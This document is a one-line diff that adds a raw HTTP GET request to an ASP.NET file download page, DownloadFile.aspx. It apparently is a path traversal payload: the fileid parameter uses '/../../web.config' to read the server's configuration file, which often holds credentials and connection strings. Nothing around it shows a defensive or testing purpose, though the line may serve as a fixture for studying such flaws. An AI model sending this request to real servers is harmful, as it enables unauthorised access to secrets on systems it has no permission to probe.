@@ -1,0 +1,1 @@
+GET /webForms/Download/DownloadFile.aspx?fileid=/../../web.config&flag=report HTTP/1.1
